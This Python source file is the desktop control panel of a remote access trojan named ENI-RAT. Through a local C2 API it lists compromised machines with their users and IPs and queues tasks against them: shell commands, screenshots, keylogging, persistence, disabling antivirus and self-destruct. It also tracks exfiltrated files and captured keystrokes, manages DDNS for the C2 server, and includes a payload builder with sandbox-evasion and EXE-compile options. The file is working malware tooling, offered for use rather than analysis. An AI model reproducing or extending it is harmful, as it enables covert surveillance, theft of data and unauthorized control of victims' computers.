#!/usr/bin/env python3
"""
ENI-RAT Desktop GUI v1.0
Cute dark hacker-style control panel using CustomTkinter

Features:
    - Real-time agent list with online/offline indicators
    - Command terminal for each agent
    - Live keystroke viewer
    - Screenshot gallery
    - File browser/exfiltrator
    - DDNS manager
    - AV bypass controls
"""

import os
import sys
import json
import time
import threading
import subprocess
import requests
from pathlib import Path
from datetime import datetime
from urllib.parse import urljoin

try:
    import customtkinter as ctk
    from PIL import Image, ImageTk
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox
    GUI_AVAIL = True
except ImportError:
    GUI_AVAIL = False

# ─── CONFIG ────────────────────────────────────────────────────────────────
C2_HOST = "127.0.0.1"
C2_API_PORT = 5000
REFRESH_INTERVAL = 3000  # ms

# ─── THEME ──────────────────────────────────────────────────────────────────
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

COLORS = {
    "bg": "#0a0a0f",
    "surface": "#12121a",
    "surface2": "#1a1a2e",
    "border": "#2a2a3e",
    "text": "#e0e0e0",
    "text_dim": "#8888aa",
    "accent": "#ff6b9d",
    "accent2": "#c084fc",
    "green": "#34d399",
    "red": "#ef4444",
    "orange": "#f97316",
    "terminal_bg": "#0d0d14",
    "terminal_text": "#00ff41",
}

# ─── API CLIENT ──────────────────────────────────────────────────────────────
class APIClient:
    def __init__(self, host=C2_HOST, port=C2_API_PORT):
        self.base = f"http://{host}:{port}"
    
    def get(self, path):
        try:
            r = requests.get(urljoin(self.base, path), timeout=10)
            return r.json() if r.ok else {"error": r.text}
        except Exception as e:
            return {"error": str(e)}
    
    def post(self, path, data=None):
        try:
            r = requests.post(urljoin(self.base, path), json=data or {}, timeout=10)
            return r.json() if r.ok else {"error": r.text}
        except Exception as e:
            return {"error": str(e)}

# ─── MAIN APP ────────────────────────────────────────────────────────────────
class RATGUI:
    def __init__(self):
        self.api = APIClient()
        self.root = ctk.CTk()
        self.root.title("ENI-RAT C2 Panel")
        self.root.geometry("1280x800")
        self.root.minsize(1024, 600)
        
        # Set icon if available
        try:
            self.root.iconbitmap("gui/icon.ico")
        except:
            pass
        
        self.current_agent = None
        self.agent_data_cache = {}
        self.setup_ui()
        self.refresh_thread = threading.Thread(target=self._auto_refresh, daemon=True)
        self.refresh_thread.start()
    
    def setup_ui(self):
        """Build the complete UI"""
        # ─── Grid Layout ───
        self.root.grid_columnconfigure(1, weight=1)
        self.root.grid_rowconfigure(0, weight=1)
        
        # ─── Sidebar ───
        self.sidebar = ctk.CTkFrame(self.root, width=220, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(4, weight=1)
        
        # Logo
        logo_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        logo_frame.pack(pady=(20, 30), padx=15, fill="x")
        
        ctk.CTkLabel(
            logo_frame, text="⚡ ENI-RAT",
            font=ctk.CTkFont(size=22, weight="bold"),
            text_color=COLORS["accent"]
        ).pack(anchor="w")
        
        ctk.CTkLabel(
            logo_frame, text="Command & Control",
            font=ctk.CTkFont(size=11),
            text_color=COLORS["text_dim"]
        ).pack(anchor="w")
        
        # Stats
        self.stats_frame = ctk.CTkFrame(self.sidebar, fg_color=COLORS["surface2"], corner_radius=10)
        self.stats_frame.pack(pady=10, padx=15, fill="x")
        
        self.lbl_total = ctk.CTkLabel(self.stats_frame, text="Total: 0", font=ctk.CTkFont(size=11))
        self.lbl_total.pack(anchor="w", padx=12, pady=(8, 2))
        
        self.lbl_active = ctk.CTkLabel(self.stats_frame, text="Active: 0", font=ctk.CTkFont(size=11), text_color=COLORS["green"])
        self.lbl_active.pack(anchor="w", padx=12, pady=2)
        
        self.lbl_tasks = ctk.CTkLabel(self.stats_frame, text="Tasks: 0", font=ctk.CTkFont(size=11))
        self.lbl_tasks.pack(anchor="w", padx=12, pady=(2, 8))
        
        # Navigation
        ctk.CTkLabel(
            self.sidebar, text="NAVIGATION",
            font=ctk.CTkFont(size=10, weight="bold"),
            text_color=COLORS["text_dim"]
        ).pack(anchor="w", padx=15, pady=(15, 5))
        
        nav_items = [
            ("💻", "Agents", self.show_agents),
            ("🌐", "DDNS", self.show_ddns),
            ("📋", "Tasks", self.show_tasks),
            ("📊", "Stats", self.show_stats),
            ("🔧", "Builder", self.show_builder),
        ]
        
        self.nav_buttons = {}
        for icon, label, cmd in nav_items:
            btn = ctk.CTkButton(
                self.sidebar, text=f"{icon}  {label}",
                font=ctk.CTkFont(size=12),
                fg_color="transparent",
                hover_color=COLORS["surface2"],
                anchor="w",
                command=lambda c=cmd, n=label: self._nav_click(c, n)
            )
            btn.pack(padx=10, pady=2, fill="x")
            self.nav_buttons[label] = btn
        
        # Server status
        status_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        status_frame.pack(side="bottom", pady=15, padx=15, fill="x")
        
        self.server_dot = ctk.CTkLabel(status_frame, text="●", text_color=COLORS["green"], font=ctk.CTkFont(size=12))
        self.server_dot.pack(side="left")
        
        ctk.CTkLabel(status_frame, text="C2 Connected", font=ctk.CTkFont(size=10), text_color=COLORS["text_dim"]).pack(side="left", padx=5)
        
        # ─── Main Content ───
        self.main = ctk.CTkFrame(self.root, corner_radius=0, fg_color=COLORS["bg"])
        self.main.grid(row=0, column=1, sticky="nsew")
        self.main.grid_columnconfigure(0, weight=1)
        self.main.grid_rowconfigure(0, weight=1)
        
        # Container for page content
        self.content_frame = ctk.CTkFrame(self.main, fg_color="transparent")
        self.content_frame.grid(row=0, column=0, sticky="nsew")
        self.content_frame.grid_columnconfigure(0, weight=1)
        self.content_frame.grid_rowconfigure(0, weight=1)
        
        # Show agents by default
        self.show_agents()
    
    def _clear_content(self):
        """Clear the main content area"""
        for widget in self.content_frame.winfo_children():
            widget.destroy()
    
    def _nav_click(self, cmd, name):
        """Handle navigation click"""
        for btn in self.nav_buttons.values():
            btn.configure(fg_color="transparent")
        self.nav_buttons[name].configure(fg_color=COLORS["surface2"])
        cmd()
    
    # ═══════════════════════════════════════════════════════════════════════
    # AGENTS PAGE
    # ═══════════════════════════════════════════════════════════════════════
    def show_agents(self):
        self._clear_content()
        
        # Header
        header = ctk.CTkFrame(self.content_frame, fg_color="transparent")
        header.pack(fill="x", pady=(10, 15), padx=20)
        
        ctk.CTkLabel(
            header, text="💻 Connected Agents",
            font=ctk.CTkFont(size=20, weight="bold")
        ).pack(side="left")
        
        refresh_btn = ctk.CTkButton(
            header, text="🔄 Refresh", width=100,
            command=self._refresh_agents_table
        )
        refresh_btn.pack(side="right")
        
        # Agent count
        self.agent_count_label = ctk.CTkLabel(header, text="", font=ctk.CTkFont(size=12), text_color=COLORS["text_dim"])
        self.agent_count_label.pack(side="right", padx=15)
        
        # Scrollable frame for agents
        scroll_frame = ctk.CTkScrollableFrame(self.content_frame, fg_color=COLORS["surface"], corner_radius=12)
        scroll_frame.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        
        self.agents_scroll = scroll_frame
        
        # Load agents
        self._refresh_agents_table()
    
    def _refresh_agents_table(self):
        """Fetch and display agents"""
        data = self.api.get("/api/agents")
        agents = data.get("agents", [])
        
        # Update stats
        total = len(agents)
        active = sum(1 for a in agents if a.get("status") == "active")
        self.lbl_total.configure(text=f"Total: {total}")
        self.lbl_active.configure(text=f"Active: {active}")
        
        # Update agent count in header
        if hasattr(self, 'agent_count_label'):
            self.agent_count_label.configure(text=f"{total} total, {active} active")
        
        # Clear table
        for widget in self.agents_scroll.winfo_children():
            widget.destroy()
        
        if not agents:
            empty_frame = ctk.CTkFrame(self.agents_scroll, fg_color="transparent")
            empty_frame.pack(pady=50)
            ctk.CTkLabel(
                empty_frame, text="No agents connected yet",
                font=ctk.CTkFont(size=14),
                text_color=COLORS["text_dim"]
            ).pack()
            ctk.CTkLabel(
                empty_frame, text="Deploy a payload to see agents here",
                font=ctk.CTkFont(size=11),
                text_color=COLORS["text_dim"]
            ).pack()
            return
        
        # Table header
        header_frame = ctk.CTkFrame(self.agents_scroll, fg_color=COLORS["surface2"], corner_radius=6)
        header_frame.pack(fill="x", pady=(0, 5))
        
        cols = ["Status", "Hostname", "User", "OS", "IP", "Last Seen", "Tag", "Actions"]
        widths = [60, 140, 100, 120, 140, 140, 120, 120]
        
        for i, (col, w) in enumerate(zip(cols, widths)):
            ctk.CTkLabel(
                header_frame, text=col,
                font=ctk.CTkFont(size=10, weight="bold"),
                text_color=COLORS["text_dim"],
                width=w
            ).grid(row=0, column=i, padx=5, pady=8, sticky="w")
        
        # Agent rows
        for agent in agents:
            row = ctk.CTkFrame(self.agents_scroll, fg_color="transparent")
            row.pack(fill="x", pady=1)
            
            status = agent.get("status", "unknown")
            hostname = agent.get("hostname_tag") or agent.get("hostname", "?")
            username = agent.get("username", "?")
            os_info = f"{agent.get('os', '?')} {agent.get('arch', '')}"
            ip = agent.get("public_ip") or agent.get("private_ip", "?")
            last_seen = agent.get("last_seen", 0)
            last_seen_str = datetime.fromtimestamp(last_seen).strftime("%Y-%m-%d %H:%M") if last_seen else "never"
            tag = agent.get("hostname_tag", "?")
            
            status_colors = {"active": COLORS["green"], "awaiting": COLORS["orange"], "dead": COLORS["red"]}
            status_color = status_colors.get(status, COLORS["text_dim"])
            
            # Row data
            data_items = [
                ("●", status_color, status),
                (hostname[:25], COLORS["text"], ""),
                (username, COLORS["text"], ""),
                (os_info[:20], COLORS["text_dim"], ""),
                (ip, COLORS["text_dim"], ""),
                (last_seen_str, COLORS["text_dim"], ""),
                (tag, COLORS["text_dim"], ""),
            ]
            
            for i, (text, color, _) in enumerate(data_items):
                ctk.CTkLabel(
                    row, text=text,
                    font=ctk.CTkFont(size=11),
                    text_color=color,
                    width=widths[i],
                    anchor="w"
                ).grid(row=0, column=i, padx=5, pady=5, sticky="w")
            
            # Action buttons
            action_frame = ctk.CTkFrame(row, fg_color="transparent")
            action_frame.grid(row=0, column=7, padx=2, pady=2)
            
            aid = agent.get("agent_id", "")
            ctk.CTkButton(
                action_frame, text="▶", width=30, height=22,
                font=ctk.CTkFont(size=10),
                command=lambda a=aid: self._open_agent_console(a)
            ).pack(side="left", padx=1)
            
            ctk.CTkButton(
                action_frame, text="✕", width=30, height=22,
                font=ctk.CTkFont(size=10),
                fg_color="#3a1a1a",
                hover_color="#5a1a1a",
                command=lambda a=aid: self._delete_agent(a)
            ).pack(side="left", padx=1)
    
    def _open_agent_console(self, agent_id):
        """Open a command console for a specific agent"""
        self.current_agent = agent_id
        
        # Get agent details
        data = self.api.get(f"/api/agents/{agent_id}")
        agent = data.get("agent", {})
        hostname = agent.get("hostname_tag", agent.get("hostname", "?"))
        
        # Create new window
        console = ctk.CTkToplevel(self.root)
        console.title(f"Agent Console - {hostname}")
        console.geometry("900x650")
        console.minsize(700, 400)
        
        # ─── Info bar ───
        info_frame = ctk.CTkFrame(console, fg_color=COLORS["surface2"], corner_radius=8)
        info_frame.pack(fill="x", padx=15, pady=15)
        
        ctk.CTkLabel(
            info_frame, text=f"💻 {hostname}",
            font=ctk.CTkFont(size=16, weight="bold")
        ).pack(anchor="w", padx=15, pady=(10, 5))
        
        details = f"IP: {agent.get('public_ip', '?')} | OS: {agent.get('os', '?')} {agent.get('arch', '')} | User: {agent.get('username', '?')}"
        ctk.CTkLabel(
            info_frame, text=details,
            font=ctk.CTkFont(size=10),
            text_color=COLORS["text_dim"]
        ).pack(anchor="w", padx=15, pady=(0, 10))
        
        # ─── Quick actions ───
        actions_frame = ctk.CTkFrame(console, fg_color="transparent")
        actions_frame.pack(fill="x", padx=15, pady=(0, 10))
        
        quick_actions = [
            ("🖥️ Shell", lambda: self._send_quick_cmd(agent_id, "shell", "whoami")),
            ("📸 Screenshot", lambda: self._send_quick_cmd(agent_id, "screenshot")),
            ("⌨️ Keylog On", lambda: self._send_quick_cmd(agent_id, "keylog_start")),
            ("⌨️ Keylog Off", lambda: self._send_quick_cmd(agent_id, "keylog_stop")),
            ("🔒 Persist", lambda: self._send_quick_cmd(agent_id, "persist")),
            ("🗡️ Kill AV", lambda: self._send_quick_cmd(agent_id, "kill_av")),
            ("ℹ️ Info", lambda: self._send_quick_cmd(agent_id, "info")),
            ("💣 Self Destruct", lambda: self._send_quick_cmd(agent_id, "selfdestruct")),
        ]
        
        for icon, cmd in quick_actions:
            ctk.CTkButton(
                actions_frame, text=icon, width=95, height=30,
                font=ctk.CTkFont(size=10),
                fg_color=COLORS["surface2"],
                hover_color=COLORS["surface"],
                command=cmd
            ).pack(side="left", padx=2)
        
        # ─── Terminal ───
        term_frame = ctk.CTkFrame(console, fg_color=COLORS["terminal_bg"], corner_radius=8)
        term_frame.pack(fill="both", expand=True, padx=15, pady=(0, 10))
        
        self.term_output = ctk.CTkTextbox(
            term_frame,
            font=ctk.CTkFont(family="Courier", size=11),
            fg_color=COLORS["terminal_bg"],
            text_color=COLORS["terminal_text"],
            wrap="word"
        )
        self.term_output.pack(fill="both", expand=True, padx=8, pady=8)
        self.term_output.insert("end", f"[ENI-RAT] Console connected to {hostname}\n")
        self.term_output.insert("end", f"[ENI-RAT] Type commands or use quick actions above\n\n")
        self.term_output.configure(state="disabled")
        
        # ─── Command input ───
        input_frame = ctk.CTkFrame(console, fg_color="transparent")
        input_frame.pack(fill="x", padx=15, pady=(0, 15))
        
        self.cmd_entry = ctk.CTkEntry(
            input_frame,
            font=ctk.CTkFont(family="Courier", size=12),
            placeholder_text="Enter command (shell: ls, screenshot, info, etc.)"
        )
        self.cmd_entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
        self.cmd_entry.bind("<Return>", lambda e: self._send_command(agent_id))
        
        ctk.CTkButton(
            input_frame, text="Send", width=80,
            command=lambda: self._send_command(agent_id)
        ).pack(side="right")
    
    def _send_command(self, agent_id):
        """Send command from console input"""
        cmd_text = self.cmd_entry.get().strip()
        if not cmd_text:
            return
        self.cmd_entry.delete(0, "end")
        
        # Parse command and args
        parts = cmd_text.split(" ", 1)
        command = parts[0]
        args = parts[1] if len(parts) > 1 else ""
        
        self.term_output.configure(state="normal")
        self.term_output.insert("end", f"\n> {cmd_text}\n")
        self.term_output.see("end")
        self.term_output.configure(state="disabled")
        
        # Send task
        result = self.api.post("/api/tasks/create", {
            "agent_id": agent_id, "command": command, "args": args
        })
        
        if result.get("task_id"):
            # Poll for result
            threading.Thread(
                target=self._poll_task_result,
                args=(agent_id, result["task_id"]),
                daemon=True
            ).start()
        else:
            self.term_output.configure(state="normal")
            self.term_output.insert("end", f"Error: {result}\n")
            self.term_output.see("end")
            self.term_output.configure(state="disabled")
    
    def _send_quick_cmd(self, agent_id, command, args=""):
        """Send a quick action command"""
        self.api.post("/api/tasks/create", {
            "agent_id": agent_id, "command": command, "args": args
        })
        if hasattr(self, 'term_output') and self.term_output.winfo_exists():
            self.term_output.configure(state="normal")
            self.term_output.insert("end", f"\n[{command}] Task queued...\n")
            self.term_output.see("end")
            self.term_output.configure(state="disabled")
    
    def _poll_task_result(self, agent_id, task_id):
        """Poll for task completion"""
        time.sleep(2)
        for _ in range(30):
            data = self.api.get(f"/api/agents/{agent_id}")
            agent = data.get("agent", {})
            tasks = agent.get("tasks", [])
            for t in tasks:
                if t.get("task_id") == task_id and t.get("status") == "completed":
                    result = t.get("result", "")
                    if hasattr(self, 'term_output') and self.term_output.winfo_exists():
                        try:
                            self.term_output.configure(state="normal")
                            self.term_output.insert("end", f"{result}\n\n")
                            self.term_output.see("end")
                            self.term_output.configure(state="disabled")
                        except:
                            pass
                    return
            time.sleep(2)
    
    def _delete_agent(self, agent_id):
        """Delete an agent"""
        if messagebox.askyesno("Delete Agent", f"Delete agent {agent_id[:8]}...?"):
            self.api.post("/api/agents/delete", {"agent_id": agent_id})
            self._refresh_agents_table()
    
    # ═══════════════════════════════════════════════════════════════════════
    # DDNS PAGE
    # ═══════════════════════════════════════════════════════════════════════
    def show_ddns(self):
        self._clear_content()
        
        # Header
        header = ctk.CTkFrame(self.content_frame, fg_color="transparent")
        header.pack(fill="x", pady=(10, 15), padx=20)
        
        ctk.CTkLabel(
            header, text="🌐 Custom DDNS",
            font=ctk.CTkFont(size=20, weight="bold")
        ).pack(side="left")
        
        ctk.CTkButton(
            header, text="🔄 Refresh", width=100,
            command=self._refresh_ddns_table
        ).pack(side="right")
        
        # Scrollable list
        scroll = ctk.CTkScrollableFrame(self.content_frame, fg_color=COLORS["surface"], corner_radius=12)
        scroll.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        
        self.ddns_scroll = scroll
        self._refresh_ddns_table()
    
    def _refresh_ddns_table(self):
        """Refresh DDNS entries"""
        data = self.api.get("/api/ddns")
        entries = data.get("ddns", [])
        
        for widget in self.ddns_scroll.winfo_children():
            widget.destroy()
        
        if not entries:
            ctk.CTkLabel(
                self.ddns_scroll, text="No DDNS entries registered",
                text_color=COLORS["text_dim"]
            ).pack(pady=30)
            return
        
        for entry in entries:
            hostname = entry.get("hostname", "?")
            ip = entry.get("current_ip", "?")
            updated = entry.get("last_updated", 0)
            updated_str = datetime.fromtimestamp(updated).strftime("%Y-%m-%d %H:%M") if updated else "?"
            owner = entry.get("owner_agent", "")[:8] + "..." if entry.get("owner_agent") else "—"
            
            item = ctk.CTkFrame(self.ddns_scroll, fg_color=COLORS["surface2"], corner_radius=8)
            item.pack(fill="x", pady=3, padx=5)
            
            ctk.CTkLabel(item, text=f"{hostname}.eni", font=ctk.CTkFont(size=13, weight="bold")).pack(side="left", padx=15, pady=10)
            ctk.CTkLabel(item, text=f"→ {ip}", font=ctk.CTkFont(size=12, family="Courier"), text_color=COLORS["green"]).pack(side="left", padx=10)
            ctk.CTkLabel(item, text=f"Updated: {updated_str}", font=ctk.CTkFont(size=10), text_color=COLORS["text_dim"]).pack(side="left", padx=10)
            ctk.CTkLabel(item, text=f"Owner: {owner}", font=ctk.CTkFont(size=10), text_color=COLORS["text_dim"]).pack(side="left", padx=10)
            
            ctk.CTkButton(
                item, text="✕", width=30, height=22,
                fg_color="#3a1a1a", hover_color="#5a1a1a",
                command=lambda h=hostname: self._delete_ddns(h)
            ).pack(side="right", padx=10)
    
    def _delete_ddns(self, hostname):
        self.api.post("/api/ddns/delete", {"hostname": hostname})
        self._refresh_ddns_table()
    
    # ═══════════════════════════════════════════════════════════════════════
    # TASKS PAGE
    # ═══════════════════════════════════════════════════════════════════════
    def show_tasks(self):
        self._clear_content()
        
        header = ctk.CTkFrame(self.content_frame, fg_color="transparent")
        header.pack(fill="x", pady=(10, 15), padx=20)
        
        ctk.CTkLabel(
            header, text="📋 Recent Tasks",
            font=ctk.CTkFont(size=20, weight="bold")
        ).pack(side="left")
        
        scroll = ctk.CTkScrollableFrame(self.content_frame, fg_color=COLORS["surface"], corner_radius=12)
        scroll.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        
        data = self.api.get("/api/tasks/all")
        tasks = data.get("tasks", [])
        
        if not tasks:
            ctk.CTkLabel(scroll, text="No tasks yet", text_color=COLORS["text_dim"]).pack(pady=30)
            return
        
        for t in tasks[:100]:
            cmd = t.get("command", "?")
            args = t.get("args", "")[:40]
            status = t.get("status", "?")
            created = t.get("created_at", 0)
            created_str = datetime.fromtimestamp(created).strftime("%H:%M:%S") if created else "?"
            result = (t.get("result") or "")[:60]
            aid = t.get("agent_id", "")[:8]
            
            item = ctk.CTkFrame(scroll, fg_color=COLORS["surface2"], corner_radius=6)
            item.pack(fill="x", pady=2, padx=5)
            
            ctk.CTkLabel(item, text=created_str, font=ctk.CTkFont(size=10), text_color=COLORS["text_dim"], width=70).pack(side="left", padx=8)
            ctk.CTkLabel(item, text=cmd, font=ctk.CTkFont(size=11, weight="bold"), width=80).pack(side="left")
            ctk.CTkLabel(item, text=args, font=ctk.CTkFont(size=10), text_color=COLORS["text_dim"], width=150).pack(side="left")
            
            status_color = COLORS["green"] if status == "completed" else COLORS["orange"]
            ctk.CTkLabel(item, text=status, font=ctk.CTkFont(size=10), text_color=status_color, width=80).pack(side="left")
            ctk.CTkLabel(item, text=result, font=ctk.CTkFont(size=9), text_color=COLORS["text_dim"], width=300).pack(side="left")
            ctk.CTkLabel(item, text=aid, font=ctk.CTkFont(size=9, family="Courier"), text_color=COLORS["text_dim"], width=100).pack(side="left")
    
    # ═══════════════════════════════════════════════════════════════════════
    # STATS PAGE
    # ═══════════════════════════════════════════════════════════════════════
    def show_stats(self):
        self._clear_content()
        
        header = ctk.CTkFrame(self.content_frame, fg_color="transparent")
        header.pack(fill="x", pady=(10, 15), padx=20)
        
        ctk.CTkLabel(
            header, text="📊 Statistics",
            font=ctk.CTkFont(size=20, weight="bold")
        ).pack(side="left")
        
        stats = self.api.get("/api/stats")
        
        # Stats cards
        cards_frame = ctk.CTkFrame(self.content_frame, fg_color="transparent")
        cards_frame.pack(fill="x", padx=20)
        cards_frame.grid_columnconfigure((0,1,2,3), weight=1)
        
        stat_items = [
            ("💻 Total Agents", stats.get("total_agents", 0), COLORS["accent"]),
            ("🟢 Active Now", stats.get("active_agents", 0), COLORS["green"]),
            ("📋 Tasks", stats.get("total_tasks", 0), COLORS["accent2"]),
            ("⌨️ Keystrokes", stats.get("total_keystrokes", 0), COLORS["orange"]),
            ("📸 Screenshots", stats.get("total_screenshots", 0), COLORS["accent"]),
            ("📁 Exfiltrated", stats.get("total_exfiltrated", 0), COLORS["green"]),
            ("🌐 DDNS Entries", stats.get("ddns_entries", 0), COLORS["accent2"]),
        ]
        
        for i, (label, value, color) in enumerate(stat_items):
            row = i // 4
            col = i % 4
            card = ctk.CTkFrame(cards_frame, fg_color=COLORS["surface"], corner_radius=12, border_width=1, border_color=COLORS["border"])
            card.grid(row=row, column=col, padx=6, pady=6, sticky="nsew")
            
            ctk.CTkLabel(card, text=str(value), font=ctk.CTkFont(size=36, weight="bold"), text_color=color).pack(pady=(20, 5))
            ctk.CTkLabel(card, text=label, font=ctk.CTkFont(size=11), text_color=COLORS["text_dim"]).pack(pady=(0, 20))
    
    # ═══════════════════════════════════════════════════════════════════════
    # BUILDER PAGE
    # ═══════════════════════════════════════════════════════════════════════
    def show_builder(self):
        self._clear_content()
        
        header = ctk.CTkFrame(self.content_frame, fg_color="transparent")
        header.pack(fill="x", pady=(10, 15), padx=20)
        
        ctk.CTkLabel(
            header, text="🔧 Payload Builder",
            font=ctk.CTkFont(size=20, weight="bold")
        ).pack(side="left")
        
        # Builder form
        form = ctk.CTkFrame(self.content_frame, fg_color=COLORS["surface"], corner_radius=12)
        form.pack(fill="x", padx=20, pady=(0, 20))
        
        fields = [
            ("C2 Host / IP:", "host_input", C2_HOST),
            ("WebSocket Port:", "ws_port_input", "8443"),
            ("API Port:", "api_port_input", "5000"),
            ("Sleep Min (s):", "sleep_min_input", "5"),
            ("Sleep Max (s):", "sleep_max_input", "30"),
        ]
        
        self.builder_vars = {}
        for i, (label, var_name, default) in enumerate(fields):
            ctk.CTkLabel(form, text=label, font=ctk.CTkFont(size=12)).grid(row=i, column=0, padx=20, pady=8, sticky="w")
            var = ctk.StringVar(value=default)
            self.builder_vars[var_name] = var
            ctk.CTkEntry(form, textvariable=var, width=250).grid(row=i, column=1, padx=20, pady=8, sticky="w")
        
        # Checkboxes
        self.build_persist = ctk.BooleanVar(value=True)
        self.build_sandbox = ctk.BooleanVar(value=True)
        self.build_compile = ctk.BooleanVar(value=False)
        
        ctk.CTkCheckBox(form, text="Install Persistence", variable=self.build_persist).grid(row=5, column=0, padx=20, pady=5, sticky="w")
        ctk.CTkCheckBox(form, text="Sandbox Detection", variable=self.build_sandbox).grid(row=5, column=1, padx=20, pady=5, sticky="w")
        ctk.CTkCheckBox(form, text="Compile to EXE (requires PyInstaller)", variable=self.build_compile).grid(row=6, column=0, columnspan=2, padx=20, pady=5, sticky="w")
        
        # Build button
        ctk.CTkButton(
            form, text="🚀 Build Payload",
            font=ctk.CTkFont(size=14, weight="bold"),
            height=40,
            fg_color=COLORS["accent"],
            command=self._run_builder
        ).grid(row=7, column=0, columnspan=2, padx=20, pady=(15, 20))
        
        # Output area
        self.build_output = ctk.CTkTextbox(
            self.content_frame,
            font=ctk.CTkFont(family="Courier", size=11),
            height=200,
            fg_color=COLORS["terminal_bg"],
            text_color=COLORS["terminal_text"]
        )
        self.build_output.pack(fill="x", padx=20, pady=(0, 20))
        self.build_output.insert("end", "[Builder] Fill in the fields and click Build\n")
    
    def _run_builder(self):
        """Run the builder with form values"""
        host = self.builder_vars["host_input"].get()
        ws_port = self.builder_vars["ws_port_input"].get()
        api_port = self.builder_vars["api_port_input"].get()
        sleep_min = self.builder_vars["sleep_min_input"].get()
        sleep_max = self.builder_vars["sleep_max_input"].get()
        
        self.build_output.insert("end", f"\n[Builder] Building payload for {host}:{ws_port}...\n")
        
        # Run builder script in background
        def _build():
            cmd = [
                sys.executable, "builder/builder.py",
                "--host", host,
                "--ws-port", ws_port,
                "--api-port", api_port,
                "--sleep-min", sleep_min,
                "--sleep-max", sleep_max,
            ]
            if not self.build_persist.get():
                cmd.append("--no-persistence")
            if not self.build_sandbox.get():
                cmd.append("--no-sandbox-check")
            if self.build_compile.get():
                cmd.append("--compile")
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                self.build_output.insert("end", result.stdout + "\n")
                if result.stderr:
                    self.build_output.insert("end", f"Errors:\n{result.stderr[:500]}\n")
                self.build_output.insert("end", "[Builder] ✅ Build complete!\n")
            except Exception as e:
                self.build_output.insert("end", f"[Builder] ❌ Error: {e}\n")
            self.build_output.see("end")
        
        threading.Thread(target=_build, daemon=True).start()
    
    # ═══════════════════════════════════════════════════════════════════════
    # AUTO REFRESH
    # ═══════════════════════════════════════════════════════════════════════
    def _auto_refresh(self):
        """Auto-refresh agent list periodically"""
        while True:
            time.sleep(5)
            try:
                # Check server connection
                data = self.api.get("/api/stats")
                if "error" not in data:
                    self.lbl_total.configure(text=f"Total: {data.get('total_agents', 0)}")
                    self.lbl_active.configure(text=f"Active: {data.get('active_agents', 0)}")
                    self.lbl_tasks.configure(text=f"Tasks: {data.get('total_tasks', 0)}")
            except:
                pass
    
    def run(self):
        """Start the GUI"""
        self.root.mainloop()


if __name__ == "__main__":
    if not GUI_AVAIL:
        print("[!] customtkinter not installed. Install with:")
        print("    pip install customtkinter Pillow requests")
        print()
        print("[*] Falling back to terminal C2 panel...")
        print("[*] Use the web panel at http://localhost:5000 instead")
        sys.exit(1)
    
    app = RATGUI()
    app.run()
